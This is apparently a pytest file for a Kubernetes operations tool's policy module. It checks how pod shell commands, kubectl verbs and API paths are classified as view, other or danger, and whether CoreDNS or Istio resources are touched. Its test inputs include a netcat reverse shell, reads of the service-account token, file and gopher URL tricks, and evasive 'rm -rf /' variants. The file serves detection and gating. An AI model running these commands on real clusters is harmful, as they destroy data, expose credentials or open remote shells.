"""kubedoor_tools.policy:Pod 内命令分类、kubectl / API 动作归类、目标识别"""
import json
from pathlib import Path

import pytest

from kubedoor_tools import policy
from kubedoor_tools.policy import OP_KEYS, classify_operation, classify_pod_command, cli_verb, default_commands, identify_targets

BOTH = {"coredns", "istio"}
CM_COREDNS = "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: coredns\n  namespace: kube-system\ndata:\n  Corefile: |\n    .:53 {}\n"
VS = "apiVersion: networking.istio.io/v1\nkind: VirtualService\nmetadata:\n  name: reviews\nspec:\n  hosts: [reviews]\n"
DEPLOYMENT = "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: demo\n"


# ---------------------------------------------------------------- Pod 内命令分类(默认清单)

@pytest.mark.parametrize("argv", [
    ["ls", "-la"],
    ["cat", "/var/log/app.log"],
    ["grep", "kill", "/var/log/app.log"],            # 查看命令先判断,参数里的 kill 不算高危
    ["ls", "2>/dev/null"],
    ["sh", "-c", "ls 2>/dev/null | grep x && cat /tmp/y || true; wc -l /tmp/y"],
    ["bash", "-c", "ps aux >/dev/null 2>&1"],
    ["/bin/ls", "/app"],
    ["busybox", "ls", "/app"],
    ["busybox", "sh", "-c", "df -h | grep data"],
    ["curl", "-s", "http://api/health"],
    ["curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}", "-X", "HEAD", "https://api"],
    ["wget", "-qO-", "http://api/status"],
    ["wget", "--spider", "http://api/status"],
    ["nc", "-zv", "db", "3306"],
    ["find", "/app", "-name", "*.yaml"],
    ["date", "+%s"],
    ["ip", "-br", "a"],
    ["ip", "route", "get", "1.1.1.1"],
    ["mount"],
    ["env"],
    ["hostname", "-i"],
    ["sort", "-t", ":", "-k", "3", "/etc/passwd"],
    ["grep", "-r", "error", "/app/logs"],
])
def test_view_commands(argv):
    assert classify_pod_command(argv) == "view"
    result = classify_operation("pod_exec", {"argv": argv})
    assert result == {"read_only": True, "reason": result["reason"], "ops": ["pod.exec.view"], "category": "view",
                      "dangerous": False}


@pytest.mark.parametrize("argv", [
    ["touch", "/tmp/x"],
    ["sh", "-c", "touch /tmp/x 2>/dev/null"],          # 2>/dev/null 不是高危
    ["echo", "test", ">", "/tmp/file"],                 # 重定向到文件:不是查看
    ["sh", "-c", "cat /etc/hosts >> /tmp/data"],
    ["sh", "-c", "ls &"],                               # 后台
    ["sh", "-c", "(ls)"],                               # 子 shell
    ["sh", "-c", "cat $HOME/x"],                        # 变量
    ["sh", "-c", "cat <<EOF"],                          # heredoc
    ["curl", "-X", "POST", "http://api"],
    ["curl", "-d", "a=1", "http://api"],
    ["curl", "-o", "/tmp/out", "http://api"],
    ["curl", "-K", "cfg", "http://api"],
    ["curl", "file:///etc/passwd"],
    ["curl", "gopher://redis:6379/_x"],
    ["wget", "-O", "x", "http://api"],
    ["wget", "http://api"],                             # 默认会写文件
    ["nc", "-e", "/bin/sh", "host", "1234"],
    ["nc", "-l", "-p", "8080"],
    ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"],
    ["cat", "/run/secrets/key"],
    ["sh", "-c", "cat /var/run/s*/kubernetes.io/serviceaccount/token"],
    ["grep", "-r", "x", "/"],                           # 递归读根目录会读到 token
    ["grep", "-R", "x"],                                # 递归读当前目录(不确定)
    ["sort", "-o", "/tmp/x", "f"],
    ["date", "-s", "12:00"],
    ["date", "010100002020"],
    ["ip", "addr", "add", "1.2.3.4/24", "dev", "eth0"],
    ["ip", "a", "a", "1.2.3.4/24", "dev", "eth0"],      # 缩写
    ["ip", "link", "set", "eth0", "down"],
    ["ip", "netns", "exec", "x", "ls"],
    ["ip", "-batch", "cmds"],
    ["mount", "/dev/sdb", "/mnt"],
    ["env", "FOO=1", "ls"],
    ["hostname", "newname"],
    ["uniq", "in.txt", "out.txt"],
    ["ss", "-K", "dport", "=", ":80"],
    ["sh", "-c", "ls\ncat x"],                          # 换行
])
def test_other_commands(argv):
    assert classify_pod_command(argv) == "other"
    result = classify_operation("pod_exec", {"argv": argv})
    assert (result["read_only"], result["ops"], result["dangerous"]) == (False, ["pod.exec.other"], False)


@pytest.mark.parametrize("argv", [
    ["rm", "file"],
    ["rm", "-rf", "/tmp"],
    ["/bin/rm", "x"],
    ["kill", "-9", "1234"],
    ["pkill", "java"],
    ["killall", "nginx"],
    ["truncate", "-s", "0", "/var/log/app.log"],
    ["mkfs.ext4", "/dev/sdb"],                          # mkfs* 前缀
    ["find", "/tmp", "-delete"],                        # 「命令 参数」项
    ["find", "/tmp", "-name", "*.tmp", "-delete"],
    ["find", "/app", "-exec", "rm", "{}", ";"],
    ["ls", "|", "xargs", "rm"],
    ["sh", "-c", "ls; rm -rf /"],
    ["sh", "-c", "r''m -rf /"],                         # 引号拼接
    ["sh", "-c", "\\rm -rf /"],                         # 转义
    ["sh", "-c", "sh -c 'rm -rf /tmp/x'"],              # 嵌套
    ["sh", "-c", "echo `rm x`"],                        # 反引号
    ["sh", "-c", "ls\nrm x"],
    ["sh", "-c", "$CMD -rf /"],                         # 命令位置是变量
    ["sh", "-c", "/bin/r? -rf /"],                      # 命令位置是通配符
    ["sh", "-c", "xargs $X < list"],
    ["sh", "-c", "echo 'unclosed"],                     # 拆不开
    ["busybox", "rm", "x"],
    ["perl", "-e", "unlink 'x'"],
    ["python3", "-c", "import os; os.system('rm -rf /x')"],
])
def test_danger_commands(argv):
    assert classify_pod_command(argv) == "danger"
    result = classify_operation("pod_exec", {"argv": argv})
    assert (result["read_only"], result["ops"], result["category"], result["dangerous"]) == (
        False, ["pod.exec.danger"], "danger", True)


def test_invalid_and_empty_argv():
    assert classify_pod_command([]) == "other"
    assert classify_pod_command("rm -rf /") == "danger"     # 不是列表:拆不开,按高危
    assert classify_pod_command(["ls", 1]) == "danger"
    assert classify_operation("pod_exec", {})["ops"] == ["pod.exec.other"]


def test_oversized_input_is_not_analyzed():
    big = "x" * (300 * 1024)
    assert classify_pod_command(["echo", big]) == "danger"
    # stdin 只参与高危判断:查看命令照样是查看,其他命令太长按高危
    assert classify_pod_command(["cat"], stdin=big) == "view"
    assert classify_pod_command(["sh"], stdin=big) == "danger"


def test_master_command_lists_override_defaults():
    commands = {"view": ["ls", "awk"], "danger": ["shutdown", "tool*", "git push"]}
    assert classify_pod_command(["cat", "/x"], commands) == "other"           # 不在下发的查看清单里
    assert classify_pod_command(["awk", "{print}", "/x"], commands) == "view"  # 用户加的命令没有参数检查
    assert classify_pod_command(["rm", "x"], commands) == "other"             # 不在下发的高危清单里
    assert classify_pod_command(["toolbox", "x"], commands) == "danger"
    assert classify_pod_command(["git", "-C", "/app", "push"], commands) == "danger"
    assert classify_pod_command(["git", "status"], commands) == "other"
    # 缺少的一项用默认清单
    assert classify_pod_command(["rm", "x"], {"view": ["ls"]}) == "danger"
    assert classify_operation("pod_exec", {"argv": ["cat", "/x"]}, commands)["ops"] == ["pod.exec.other"]


def test_default_commands_file():
    data = json.loads(Path(policy.__file__).with_name("default_commands.json").read_text(encoding="utf-8"))
    assert default_commands() == data
    assert {"rm", "rmdir", "unlink", "shred", "truncate", "kill", "pkill", "killall", "reboot", "shutdown", "halt",
            "poweroff", "dd", "mkfs*", "fdisk", "parted", "find -delete"} == set(data["danger"])
    # 「命令 参数」项(find -delete)和查看命令 find 可以并存,单独的命令名不能同时出现在两个清单
    assert not set(data["view"]) & {item for item in data["danger"] if " " not in item}


def test_default_commands_match_master_copy():
    master = Path(__file__).resolve().parents[2] / "kubedoor-master" / "auth" / "default_commands.json"
    if not master.exists():
        pytest.skip("master 的 default_commands.json 不在这个目录结构里")
    assert json.loads(master.read_text(encoding="utf-8")) == default_commands()


def test_missing_command_file_fails_closed(monkeypatch, tmp_path):
    monkeypatch.setattr(policy, "_DEFAULT_COMMANDS_FILE", tmp_path / "missing.json")
    policy._default_command_lists.cache_clear()
    try:
        assert classify_pod_command(["ls"]) == "danger"
    finally:
        policy._default_command_lists.cache_clear()


# ---------------------------------------------------------------- kubectl

def kubectl(*argv, **extra):
    return classify_operation("kubectl", {"argv": list(argv), **extra})


@pytest.mark.parametrize("argv,read_only,ops", [
    (["get", "pods", "-A"], True, []),
    (["exec", "web", "-c", "app", "--", "ls", "/app"], True, ["pod.exec.view"]),
    (["exec", "web", "--", "touch", "/tmp/x"], False, ["pod.exec.other"]),
    (["exec", "web", "--", "sh", "-c", "rm -rf /tmp/x"], False, ["pod.exec.danger"]),
    (["exec", "web", "ls"], False, ["pod.exec.danger"]),              # 没有 --:分不清命令
    (["cp", "web:/tmp/x", "/tmp/y"], False, ["pod.exec.other"]),
    (["delete", "pod", "web"], False, ["ai.k8s_write", "pod.delete"]),
    (["delete", "po/web", "-n", "demo"], False, ["ai.k8s_write", "pod.delete"]),
    (["-v", "5", "delete", "pod", "web"], False, ["ai.k8s_write", "pod.delete"]),   # 全局参数带值
    (["delete", "deployment", "app", "-n", "demo"], False, ["ai.k8s_write", "resource.delete"]),
    (["delete", "pod,svc", "web"], False, ["ai.k8s_write", "pod.delete", "resource.delete"]),
    (["scale", "deploy/app", "--replicas=3"], False, ["ai.k8s_write", "workload.scale"]),
    (["rollout", "restart", "deployment", "app"], False, ["ai.k8s_write", "workload.restart"]),
    (["rollout", "undo", "deployment/app"], False, ["ai.k8s_write", "resource.apply"]),
    (["rollout", "status", "deployment/app"], False, ["ai.k8s_write"]),
    (["set", "image", "deploy/app", "app=img:v2"], False, ["ai.k8s_write", "workload.image"]),
    (["set", "env", "deploy/app", "A=1"], False, ["ai.k8s_write", "resource.apply"]),
    (["cordon", "node1"], False, ["ai.k8s_write", "node.cordon"]),
    (["uncordon", "node1"], False, ["ai.k8s_write", "node.cordon"]),
    (["drain", "node1", "--ignore-daemonsets"], False, ["ai.k8s_write", "node.cordon", "pod.delete"]),
    (["label", "deploy", "app", "tier=web"], False, ["ai.k8s_write", "resource.apply"]),
    (["create", "deployment", "x", "--image=nginx"], False, ["ai.k8s_write", "resource.apply"]),
    (["attach", "web"], False, ["ai.k8s_write", "pod.exec.danger"]),
    (["get", "--raw", "/api/v1/namespaces/a/pods/b/exec"], False, ["ai.k8s_write", "pod.exec.danger"]),
    (["future-plugin", "inspect"], False, ["ai.k8s_write"]),          # 未知动作
])
def test_kubectl_actions(argv, read_only, ops):
    result = kubectl(*argv)
    assert (result["read_only"], result["ops"]) == (read_only, ops)


def test_kubectl_exec_categories():
    assert kubectl("exec", "web", "--", "ls")["category"] == "view"
    danger = kubectl("exec", "web", "--", "kill", "1")
    assert (danger["category"], danger["dangerous"]) == ("danger", True)
    # -i 时 stdin 送进容器,参与高危判断
    assert kubectl("exec", "-i", "web", "--", "sh", stdin="rm -rf /data")["ops"] == ["pod.exec.danger"]
    assert kubectl("exec", "web", "--", "sh", stdin="rm -rf /data")["ops"] == ["pod.exec.other"]
    assert kubectl("exec", "web", "--", "cat", "/x")["ops"] == ["pod.exec.view"]
    assert classify_operation("kubectl", {"argv": ["exec", "web", "--", "cat", "/x"]},
                              {"view": ["ls"], "danger": []})["ops"] == ["pod.exec.other"]


def test_kubectl_apply_manifests():
    files = {"app.yaml": DEPLOYMENT, "vs.yaml": VS}
    assert kubectl("apply", "-f", "app.yaml", files=files)["ops"] == ["ai.k8s_write", "resource.apply"]
    assert kubectl("apply", "-f", "vs.yaml", files=files)["ops"] == ["ai.k8s_write", "resource.apply", "network.istio"]
    assert kubectl("apply", "-f", "-", stdin=CM_COREDNS)["ops"] == ["ai.k8s_write", "resource.apply", "network.coredns"]
    both = ["ai.k8s_write", "resource.apply", "network.coredns", "network.istio"]
    assert kubectl("apply", "-k", "overlay")["ops"] == both                 # kustomize 内容拿不到
    assert kubectl("apply", "-f", "missing.yaml", files=files)["ops"] == both
    assert kubectl("apply", "-f", "-", stdin="kind: [")["ops"] == both      # 解析失败
    assert kubectl("delete", "-f", "-", stdin="apiVersion: v1\nkind: Pod\nmetadata:\n  name: p\n")["ops"] == [
        "ai.k8s_write", "pod.delete"]


@pytest.mark.parametrize("argv,targets", [
    (["delete", "cm", "-n", "kube-system", "--all"], {"coredns"}),
    (["delete", "configmaps", "-l", "k8s-app=kube-dns", "-nkube-system"], {"coredns"}),
    (["delete", "cm", "-n", "kube-system"], {"coredns"}),                  # 没写名称
    (["patch", "configmap", "coredns", "--namespace=kube-system", "-p", "{}"], {"coredns"}),
    (["edit", "cm/coredns", "-n", "kube-system"], {"coredns"}),
    (["label", "cm", "coredns", "a=b"], {"coredns"}),                       # 命名空间不确定
    (["delete", "cm", "--all", "-A"], {"coredns"}),
    (["label", "cm", "app-config", "a=b", "-n", "kube-system"], set()),
    (["patch", "cm", "coredns", "-n", "demo", "-p", "{}"], set()),
    (["delete", "vs", "reviews", "-n", "demo"], {"istio"}),
    (["annotate", "virtualservices.networking.istio.io/reviews", "a=b"], {"istio"}),
    (["delete", "gw", "public"], {"istio"}),
    (["delete", "istio-io", "--all"], {"istio"}),
    (["delete", "deployment", "app", "-n", "demo"], set()),
    (["scale", "deploy/app", "--replicas", "2"], set()),
])
def test_kubectl_targets(argv, targets):
    ops = kubectl(*argv)["ops"]
    assert {op for op in ops if op.startswith("network.")} == {f"network.{t}" for t in targets}


# ---------------------------------------------------------------- Kubernetes API

@pytest.mark.parametrize("method,path,ops", [
    ("GET", "/api/v1/namespaces/demo/pods", []),
    ("DELETE", "/api/v1/namespaces/demo/pods/web", ["ai.k8s_write", "pod.delete"]),
    ("DELETE", "/api/v1/namespaces/demo/pods", ["ai.k8s_write", "pod.delete"]),
    ("DELETE", "/api/v1/namespaces/demo/podtemplates/web", ["ai.k8s_write", "resource.delete"]),
    ("DELETE", "/apis/apps/v1/namespaces/demo/deployments/app", ["ai.k8s_write", "resource.delete"]),
    ("PATCH", "/apis/apps/v1/namespaces/demo/deployments/app/scale", ["ai.k8s_write", "workload.scale"]),
    ("POST", "/apis/apps/v1/namespaces/demo/deployments", ["ai.k8s_write", "resource.apply"]),
    ("PUT", "/api/v1/namespaces/demo/services/web", ["ai.k8s_write", "resource.apply"]),
    ("POST", "/api/v1/namespaces/demo/pods/web/eviction", ["ai.k8s_write", "pod.delete"]),
    ("POST", "/api/v1/namespaces/demo/pods/web/exec", ["ai.k8s_write", "pod.exec.danger"]),
    ("GET", "/api/v1/namespaces/demo/pods/web/attach", ["ai.k8s_write", "pod.exec.danger"]),
    ("GET", "/api/v1/namespaces/demo/pods/web/%65xec", ["ai.k8s_write", "pod.exec.danger"]),
    ("PATCH", "/api/v1/namespaces/kube-system/configmaps/coredns", ["ai.k8s_write", "resource.apply", "network.coredns"]),
    ("PATCH", "/api/v1/namespaces/kube-system/configmaps/%63oredns", ["ai.k8s_write", "resource.apply", "network.coredns"]),
    ("DELETE", "/api/v1/namespaces/kube-system/configmaps", ["ai.k8s_write", "resource.delete", "network.coredns"]),
    ("PUT", "/apis/networking.istio.io/v1/namespaces/demo/virtualservices/r", ["ai.k8s_write", "resource.apply", "network.istio"]),
])
def test_api_actions(method, path, ops):
    result = classify_operation("api", {"method": method, "path": path})
    assert (result["read_only"], result["ops"]) == (not ops, ops)
    assert result["dangerous"] is ("pod.exec.danger" in ops)


def test_api_create_configmap_in_kube_system_checks_body_name():
    path = "/api/v1/namespaces/kube-system/configmaps"
    other = classify_operation("api", {"method": "POST", "path": path, "body": {"metadata": {"name": "app"}}})
    assert other["ops"] == ["ai.k8s_write", "resource.apply"]
    for body in ({"metadata": {"name": "coredns"}}, None, [{"op": "add"}]):
        assert "network.coredns" in classify_operation("api", {"method": "POST", "path": path, "body": body})["ops"]


# ---------------------------------------------------------------- istioctl / diagnostic

def test_istioctl_and_diagnostic():
    assert classify_operation("istioctl", {"argv": ["proxy-status"]})["ops"] == []
    install = classify_operation("istioctl", {"argv": ["install", "--set", "profile=demo"]})
    assert (install["read_only"], install["ops"]) == (False, ["ai.k8s_write", "network.istio"])
    assert classify_operation("diagnostic", {"program": "jq", "argv": ["."]})["ops"] == []
    assert classify_operation("diagnostic", {"program": "curl", "argv": ["https://x"]})["ops"] == ["ai.diagnostic"]
    assert classify_operation("diagnostic", {"program": "yq", "argv": ["-i", ".a=1", "f.yaml"]})["ops"] == ["ai.diagnostic"]


# ---------------------------------------------------------------- 目标识别

@pytest.mark.parametrize("kwargs,targets", [
    ({"yaml_content": CM_COREDNS}, {"coredns"}),
    ({"yaml_content": CM_COREDNS.replace("  namespace: kube-system\n", "")}, {"coredns"}),     # 命名空间不确定
    ({"yaml_content": CM_COREDNS.replace("  namespace: kube-system\n", ""), "namespace": "demo"}, set()),
    ({"yaml_content": CM_COREDNS.replace("name: coredns", "name: app-config")}, set()),
    ({"yaml_content": VS}, {"istio"}),
    ({"yaml_content": DEPLOYMENT}, set()),
    ({"yaml_content": DEPLOYMENT + "---\n" + VS + "---\n" + CM_COREDNS}, BOTH),
    ({"yaml_content": "apiVersion: v1\nkind: List\nitems:\n- apiVersion: security.istio.io/v1\n  kind: AuthorizationPolicy\n"}, {"istio"}),
    ({"yaml_content": '{"apiVersion": "networking.istio.io/v1", "kind": "Gateway"}'}, {"istio"}),
    ({"yaml_content": "kind: ["}, BOTH),                       # 解析失败
    ({"yaml_content": "just a string"}, BOTH),
    ({"yaml_content": "metadata:\n  name: x\n"}, BOTH),        # 缺 kind / apiVersion
    ({}, BOTH),                                                # 没给任何数据
    ({"yaml_content": "", "resource_type": ""}, BOTH),
    ({"resource_type": "vs"}, {"istio"}),
    ({"resource_type": "virtualservice", "name": "r", "namespace": "demo"}, {"istio"}),
    ({"resource_type": "envoyfilters.networking.istio.io"}, {"istio"}),
    ({"resource_type": "configmap", "name": "coredns", "namespace": "kube-system"}, {"coredns"}),
    ({"resource_type": "cm", "name": "coredns"}, {"coredns"}),
    ({"resource_type": "configmap", "name": "app", "namespace": "kube-system"}, set()),
    ({"resource_type": "configmap", "name": "coredns", "namespace": "demo"}, set()),
    ({"resource_type": "deployment", "name": "app", "namespace": "demo"}, set()),
    ({"api_path": "/apis/networking.istio.io/v1/namespaces/demo/virtualservices/r"}, {"istio"}),
    ({"api_path": "/apis/apiextensions.k8s.io/v1/customresourcedefinitions/gateways.networking.istio.io"}, {"istio"}),
    ({"api_path": "/api/v1/namespaces/kube-system/configmaps/coredns"}, {"coredns"}),
    ({"api_path": "/api/v1/namespaces/kube-system/configmaps"}, {"coredns"}),
    ({"api_path": "/api/v1/namespaces/kube-system/configmaps/kube-proxy"}, set()),
    ({"api_path": "/apis/apps/v1/namespaces/demo/deployments/app"}, set()),
    ({"api_path": "/api/v1/namespaces/kube-system/configmaps/%2563oredns"}, {"coredns"}),
])
def test_identify_targets(kwargs, targets):
    assert identify_targets(**kwargs) == targets


# ---------------------------------------------------------------- 其他

def test_cli_verb_follows_cobra_flag_rules():
    assert cli_verb(["-n", "team", "get", "pods"]) == ("get", 2)
    assert cli_verb(["-v", "5", "delete", "pod", "x"]) == ("delete", 2)
    assert cli_verb(["--namespace=team", "get"]) == ("get", 1)
    assert cli_verb(["--match-server-version", "get"]) == ("get", 1)
    assert cli_verb(["--", "get"]) == ("", -1)


def test_op_keys_cover_every_classified_op():
    assert OP_KEYS == {
        "pod.shell", "node.shell", "pod.exec.view", "pod.exec.other", "pod.exec.danger",
        "workload.restart", "workload.scale", "workload.schedule", "workload.image",
        "pod.delete", "pod.isolate", "pod.jvm", "resource.apply", "resource.delete", "resource.secret",
        "ai.k8s_write", "ai.diagnostic", "node.cordon", "balance.run", "control.edit",
        "network.coredns", "network.tcp", "network.istio", "alert.operate", "alert.silence",
    }
    samples = [
        ("pod_exec", {"argv": ["ls"]}), ("pod_exec", {"argv": ["touch", "x"]}), ("pod_exec", {"argv": ["rm", "x"]}),
        ("kubectl", {"argv": ["delete", "pod,cm", "coredns", "-n", "kube-system"]}),
        ("kubectl", {"argv": ["drain", "n1"]}), ("kubectl", {"argv": ["rollout", "x", "deploy/a"]}),
        ("kubectl", {"argv": ["set", "x", "deploy/a"]}), ("kubectl", {"argv": ["apply", "-k", "x"]}),
        ("kubectl", {"argv": ["scale", "deploy/a"]}), ("kubectl", {"argv": ["cp", "a", "b"]}),
        ("api", {"method": "POST", "path": "/api/v1/namespaces/a/pods/b/exec"}),
        ("api", {"method": "PATCH", "path": "/apis/apps/v1/namespaces/a/deployments/b/scale"}),
        ("istioctl", {"argv": ["install"]}), ("diagnostic", {"program": "curl", "argv": ["https://x"]}),
    ]
    seen = set()
    for operation, arguments in samples:
        seen |= set(classify_operation(operation, arguments)["ops"])
    assert seen <= OP_KEYS
    assert {"pod.exec.view", "pod.exec.other", "pod.exec.danger", "pod.delete", "resource.delete", "node.cordon",
            "workload.restart", "workload.image", "workload.scale", "resource.apply", "network.coredns",
            "network.istio", "ai.k8s_write", "ai.diagnostic"} <= seen
